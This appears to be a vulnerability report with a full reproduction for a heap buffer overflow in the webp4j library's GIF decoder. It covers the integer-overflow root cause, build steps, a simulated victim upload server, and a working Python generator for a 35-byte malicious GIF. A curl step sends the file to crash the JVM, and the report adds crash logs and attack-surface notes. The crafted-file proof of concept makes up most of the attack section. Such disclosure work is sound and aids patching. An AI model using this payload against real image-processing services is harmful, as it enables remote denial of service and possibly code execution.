## webp4j Heap Buffer Overflow Vulnerability

### Vulnerability Principle

The `DecodeGifFromMemory()` function in `gif_decoder.c` reads the canvas width and height (16-bit, maximum 65535) from the Logical Screen Descriptor of a GIF file, then calculates `canvas_size = width * height * 4`. This multiplication uses `int` (32-bit signed) arithmetic. When `width=46341, height=46341`:

```
46341 × 46341 × 4 = 8,589,953,124 (actual value)
int32 overflow result = 18,532 (a very small positive number!)
```

`malloc(18532)` successfully allocates an 18KB buffer, but then `ClearCanvas()` attempts to write 8.5GB of data into it, causing a **massive heap buffer overflow**.

**Vulnerable Code** (`src/main/c/gif_decoder.c:153`):
```c
result->canvas_width = gif->SWidth;   // From GIF file header (attacker-controlled)
result->canvas_height = gif->SHeight; // From GIF file header (attacker-controlled)
int canvas_size = result->canvas_width * result->canvas_height * 4;  // Integer overflow!
uint8_t* canvas = (uint8_t*)malloc(canvas_size);  // malloc(18532) — allocates 18KB
ClearCanvas(canvas, result->canvas_width, result->canvas_height, ...);  // Writes 8.5GB!
```

### Reproduction Steps (Using macOS)

#### Step 1: Clone Project (with Submodules)

```bash
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-21.jdk/Contents/Home
export http_proxy="http://127.0.0.1:7890"
export https_proxy="http://127.0.0.1:7890"

cd /tmp/jni-vuln-reproduce
git clone --recursive https://github.com/MrNanko/webp4j.git
cd webp4j
```

#### Step 2: Compile Native Library (CMake)

CMake will automatically download giflib 5.2.2 and link it statically:

```bash
mkdir -p build && cd build
cmake -DCMAKE_BUILD_TYPE=Release ..
make -j8
```

Verify compilation results:
```bash
file lib/libwebp4j-mac-arm64.dylib
# Output: Mach-O 64-bit dynamically linked shared library arm64
```

#### Step 3: Install Native Library to Resources Directory

```bash
cmake --install .
# Output: Installing: .../src/main/resources/native/libwebp4j-mac-arm64.dylib
```

#### Step 4: Compile Java Classes (Maven)

```bash
cd /tmp/jni-vuln-reproduce/webp4j
mvn compile -DskipTests -Dgpg.skip=true
```

#### Step 5: Create Victim's Server Code

Create `VulnServerWebP.java` — an HTTP service that receives GIF uploads and converts them to WebP (simulating an image CDN/CMS):

```bash
cat > VulnServerWebP.java << 'JAVA_EOF'
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpExchange;
import dev.matrixlab.webp4j.WebPCodec;
import java.io.*;
import java.net.InetSocketAddress;

public class VulnServerWebP {
    public static void main(String[] args) throws Exception {
        int port = args.length > 0 ? Integer.parseInt(args[0]) : 8080;
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);

        server.createContext("/api/convert/gif-to-webp", exchange -> {
            if (!"POST".equals(exchange.getRequestMethod())) {
                sendResponse(exchange, 405, "Method Not Allowed"); return;
            }
            byte[] gifData = exchange.getRequestBody().readAllBytes();
            System.out.println("[GIF->WebP] Received " + gifData.length + " bytes from " +
                exchange.getRemoteAddress());
            try {
                byte[] webpData = WebPCodec.encodeGifToWebP(gifData);
                if (webpData != null) {
                    System.out.println("[GIF->WebP] Converted to " + webpData.length + " bytes");
                    exchange.getResponseHeaders().set("Content-Type", "image/webp");
                    exchange.sendResponseHeaders(200, webpData.length);
                    exchange.getResponseBody().write(webpData);
                    exchange.getResponseBody().close();
                } else {
                    sendResponse(exchange, 400, "Conversion failed");
                }
            } catch (Exception e) {
                System.out.println("[GIF->WebP] Error: " + e);
                sendResponse(exchange, 500, "Error: " + e.getMessage());
            }
        });

        server.createContext("/health", exchange -> {
            sendResponse(exchange, 200, "OK");
        });

        server.setExecutor(null);
        server.start();
        System.out.println("=== webp4j VulnServer started on port " + port + " ===");
        System.out.println("POST /api/convert/gif-to-webp - GIF to WebP conversion");
    }

    private static void sendResponse(HttpExchange ex, int code, String body) throws IOException {
        byte[] b = body.getBytes();
        ex.sendResponseHeaders(code, b.length);
        ex.getResponseBody().write(b);
        ex.getResponseBody().close();
    }
}
JAVA_EOF

$JAVA_HOME/bin/javac -cp target/classes -d target/classes VulnServerWebP.java
```

#### Step 6: Start Victim Service

```bash
$JAVA_HOME/bin/java -cp target/classes VulnServerWebP 8080 &
sleep 2
curl -s http://127.0.0.1:8080/health
# Output: OK
```

#### Step 7: Generate Malicious GIF File

Construct a 35-byte GIF89a file with Logical Screen Descriptor width/height set to 46341×46341, but the actual image in the Image Descriptor is only 1×1 pixel:

```bash
python3 -c "
import struct, sys
buf = bytearray()
buf += b'GIF89a'                              # GIF89a header
buf += struct.pack('<HH', 46341, 46341)       # Logical screen width/height: 46341x46341
buf += bytes([0x80, 0x00, 0x00])              # GCT flag=1, 2 colors, background=0
buf += bytes([0x00,0x00,0x00, 0xFF,0xFF,0xFF])# Global color table (black+white)
buf += bytes([0x2C])                          # Image separator
buf += struct.pack('<HH', 0, 0)              # Image position: (0,0)
buf += struct.pack('<HH', 1, 1)              # Image size: 1x1
buf += bytes([0x00])                          # No local color table
buf += bytes([0x02, 0x02, 0x4C, 0x01, 0x00]) # LZW compressed data
buf += bytes([0x3B])                          # GIF terminator
sys.stdout.buffer.write(buf)
" > malicious.gif

ls -la malicious.gif
# 35 bytes — a legitimate GIF file, but canvas size triggers integer overflow
```

#### Step 8: Send Malicious GIF — Trigger Heap Overflow

```bash
curl -s -X POST --data-binary @malicious.gif http://127.0.0.1:8080/api/convert/gif-to-webp

# curl returns empty response or connection reset

sleep 1
curl -s --max-time 3 http://127.0.0.1:8080/health || echo "SERVER IS DOWN"
# Output: SERVER IS DOWN
```

### Expected Results

Server output:
```
[GIF->WebP] Received 35 bytes from /127.0.0.1:XXXXX
#
# A fatal error has been detected by the Java Runtime Environment:
#
#  SIGSEGV (0xb) at pc=0x..., pid=XXXXX, tid=XXXXX
#
# Problematic frame:
# C  [libwebp4j-mac-arm64.dylib+0x2c11c]  ConvertRGBToY_NEON+0xcc
#
# The crash happened outside the Java Virtual Machine in native code.
```

**The entire JVM process crashes due to heap buffer overflow in native code.** An attacker only needs to upload a 35-byte GIF file to achieve remote DoS, and this overflow has potential remote code execution risk.

### Actual Reproduction Results

```
[GIF->WebP] Received 35 bytes from /127.0.0.1:63620
#
#  SIGSEGV (0xb) at pc=0x000000010b82c11c, pid=1383, tid=24835
#
# Problematic frame:
# C  [webp4j-2753025955301377843-libwebp4j-mac-arm64.dylib+0x2c11c]  ConvertRGBToY_NEON+0xcc
#
# The crash happened outside the Java Virtual Machine in native code.
```

JVM crash log saved to: `hs_err_pid1383.log`

The crash occurs in the `ConvertRGBToY_NEON` function, which is libwebp's color conversion function. The crash path is:
```
DecodeGifFromMemory()
  → malloc(18532)           // Small value after overflow
  → ClearCanvas()           // Write 8.5GB to 18KB buffer → heap overflow
  → WebPEncodeRGBA()        // Try to encode corrupted heap data
    → ConvertRGBToY_NEON()  // Access corrupted memory → SIGSEGV
```

---

## Integer Overflow Analysis

| Width | Height | width×height×4 (Actual) | int32 Result | Overflow? | Effect |
|-------|--------|------------------------|--------------|-----------|--------|
| 100 | 100 | 40,000 | 40,000 | No | Normal |
| 23170 | 23170 | 2,147,395,600 | 2,147,395,600 | No | Normal (near INT_MAX) |
| **23171** | **23171** | **2,147,580,964** | **-2,147,386,332** | **Yes** | malloc fails (negative) |
| **46341** | **46341** | **8,589,953,124** | **18,532** | **Yes** | **malloc(18KB) succeeds, write 8.5GB → heap overflow!** |
| 65535 | 65535 | 17,179,344,900 | -524,284 | Yes | malloc fails (negative) |

**46341×46341 is the most dangerous case**: The overflow produces a very small positive number (18532), causing malloc to successfully allocate a tiny buffer, and subsequent write operations far exceed the buffer boundary.

---

## Attack Scenario Summary

### jnicompressions (LZ4/Snappy)

**Affected Application Types**:
- Message queue consumers (receiving compressed messages and decompressing)
- Data pipelines (decompression steps in ETL)
- RPC services (protocols using LZ4/Snappy compression)
- Log aggregation systems (receiving compressed logs)

**Attack Cost**: Extremely low. LZ4 attack requires only 8 bytes, Snappy attack can use any random data.

### webp4j (GIF→WebP)

**Affected Application Types**:
- Image CDNs (automatic format conversion)
- CMS/Blog platforms (user image uploads)
- Social media backends (image processing)
- Image optimization services

**Attack Cost**: Extremely low. The malicious GIF file is only 35 bytes, is a legitimately formatted GIF file, and can be submitted through any file upload interface.

---

## File Inventory

After reproduction is complete, the working directory structure:

```
/tmp/jni-vuln-reproduce/
├── jnicompressions/                    # Original project cloned from GitHub
│   ├── src/                            # Original source code (unmodified)
│   ├── target/
│   │   ├── libcompressions.dylib       # Compiled native library
│   │   └── classes/                    # Compiled Java classes + VulnServer
│   ├── VulnServer.java                 # Simulated victim HTTP service
│   └── hs_err_pid*.log                 # JVM crash log
├── webp4j/                             # Original project cloned from GitHub (with libwebp submodule)
│   ├── src/                            # Original source code (unmodified)
│   ├── build/
│   │   └── lib/libwebp4j-mac-arm64.dylib  # Compiled native library
│   ├── target/classes/                 # Compiled Java classes + VulnServerWebP
│   ├── VulnServerWebP.java            # Simulated victim HTTP service
│   └── hs_err_pid*.log                # JVM crash log
└── malicious_46341.gif                 # 35-byte malicious GIF file
```
